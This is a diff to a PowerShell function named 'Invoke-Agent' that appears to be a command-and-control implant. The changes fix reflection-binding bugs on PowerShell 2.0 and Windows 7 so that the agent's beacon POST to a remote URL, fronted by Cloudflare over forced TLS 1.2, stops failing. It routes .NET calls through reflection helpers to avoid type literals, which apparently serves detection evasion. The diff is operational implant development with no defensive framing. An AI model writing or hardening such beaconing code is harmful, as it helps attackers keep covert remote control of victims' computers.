@@ -55,7 +55,11 @@ function Invoke-Agent {
     # tight loops.
     # Process env reads/writes go through the env: drive — same semantics as
     # Environment.Get/SetEnvironmentVariable(…, Process), one less type literal.
-    function ReadEnv($name) { return (Get-Item ('env:' + $name) -ErrorAction SilentlyContinue).Value }
+    # PS 2.0 FIELD FIX (Win7, 2026-09-22): the raw .Value extraction reached the reflection
+    # binder as a wrapped string on PS 2.0 — WebRequest.Create(@($url)) then found NO overload
+    # ("method not found") and the agent died 'fail' on the first beacon POST. '' + x is a
+    # guaranteed RAW System.String on every PS version. Missing vars still yield '' (falsy).
+    function ReadEnv($name) { return ('' + (Get-Item ('env:' + $name) -ErrorAction SilentlyContinue).Value) }
     function U32Bytes([uint32]$n) { return ,(CallStatic (ResolveM 'System.BitConverter') 'GetBytes' @([uint32]$n)) }
     # PS '+' on arrays builds object[] — the [byte[]] cast restores the wire type before
     # anything reflection-bound consumes it.
@@ -142,7 +146,10 @@ function Invoke-Agent {
     # byte (so it carries the 45s receive budget), ReadWriteTimeout caps each stream
     # read/write at the send/receive figures.
     function NewPostRequest($timeoutMs) {
-        $req = CallStatic (ResolveS 'System.Net.WebRequest') 'Create' @($script:beaconUrl)
+        # [string] cast at the binder boundary (the house rule: every non-primitive argument
+        # is cast at the call site) — the URL is a plain variable, and PS 2.0 let the wrapped
+        # form through to InvokeMember, killing the request with "Create not found".
+        $req = CallStatic (ResolveS 'System.Net.WebRequest') 'Create' @([string]$script:beaconUrl)
         SetProp $req 'Method' 'POST'
         SetProp $req 'ContentType' 'application/octet-stream'
         SetProp $req 'Timeout' $timeoutMs
@@ -375,9 +382,16 @@ function Invoke-Agent {
     # locked-down host can't make the agent fail before it beacons. The binder refuses
     # int->enum, so the flags value is rebuilt through Enum.ToObject.
     try {
-        $proto = GetPropS (ResolveS 'System.Net.ServicePointManager') 'SecurityProtocol'
+        # PS 2.0 FIELD FIX (Win7, 2026-09-22): the helpers return COMMA-WRAPPED (object[1]).
+        # $proto.GetType() on the wrapper returned object[] → Enum.ToObject threw → the whole
+        # bump was swallowed here (no [3] dbg) → the handshake fell back to TLS 1.0-only and
+        # Cloudflare would refuse the POST even once Create binds. @(…)[0] unwraps under both
+        # binding semantics (no-op on a raw scalar), and $tls12 is unwrapped so SetPropS's
+        # internal @() can't re-nest it into a binder-opaque object[1][].
+        $proto = @((GetPropS (ResolveS 'System.Net.ServicePointManager') 'SecurityProtocol'))[0]
         if (([int]$proto -band 3072) -eq 0) {
-            SetPropS (ResolveS 'System.Net.ServicePointManager') 'SecurityProtocol' (CallStatic (ResolveM 'System.Enum') 'ToObject' @($proto.GetType(), ([int]$proto -bor 3072)))
+            $tls12 = @((CallStatic (ResolveM 'System.Enum') 'ToObject' @($proto.GetType(), ([int]$proto -bor 3072))))[0]
+            SetPropS (ResolveS 'System.Net.ServicePointManager') 'SecurityProtocol' $tls12
         }
         SetPropS (ResolveS 'System.Net.ServicePointManager') 'Expect100Continue' $false
         Dbg '[3] tls' 'applied' #dbg
